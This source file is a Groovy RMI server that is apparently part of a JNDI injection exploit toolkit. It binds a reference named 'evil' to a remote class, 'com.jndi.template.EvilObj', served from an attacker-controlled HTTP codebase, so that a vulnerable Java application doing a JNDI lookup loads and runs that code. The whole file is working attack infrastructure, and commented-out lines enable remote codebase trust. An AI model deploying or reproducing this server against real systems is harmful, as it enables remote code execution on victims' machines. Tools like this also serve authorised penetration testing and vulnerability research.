package com.jndi.server

import com.jndi.server.impl.JNDIServer
import com.sun.jndi.rmi.registry.ReferenceWrapper
import groovy.util.logging.Slf4j
import org.springframework.beans.factory.annotation.Value

import javax.naming.Reference
import java.rmi.registry.LocateRegistry

@Slf4j
class RMIServer implements JNDIServer {

    @Value('${server.port}')
    Integer httpPort

    @Value('${jndi.ip}')
    String ip

    @Value('${jndi.rmi.port}')
    Integer port

    @Override
    void run(String... args) throws Exception {
//        System.setProperty('com.sun.jndi.ldap.object.trustURLCodebase', 'true')
//        System.setProperty('com.sun.jndi.rmi.object.trustURLCodebase', 'true')
        LocateRegistry.createRegistry(port)
        def registry = LocateRegistry.getRegistry()
        def reference = new Reference('evilObj', 'com.jndi.template.EvilObj', "http://${ip}:${httpPort}/")
        def referenceWrapper = new ReferenceWrapper(reference)
        registry.bind('evil', referenceWrapper)
        log.info("RMI Server start on ${ip}:${port}")
    }

}

